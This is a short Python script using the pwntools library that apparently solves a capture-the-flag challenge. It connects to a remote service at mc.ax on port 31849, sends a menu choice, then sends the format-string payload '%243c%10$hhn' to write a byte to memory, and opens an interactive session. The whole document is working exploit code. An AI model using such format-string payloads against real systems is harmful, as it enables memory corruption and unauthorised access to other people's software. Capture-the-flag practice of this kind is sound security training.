from pwn import *

p = remote('mc.ax', 31849)

p.recv()
p.sendline(b'5')
p.recv()
p.sendline(b'%243c%10$hhn')
p.recv()
p.interactive()
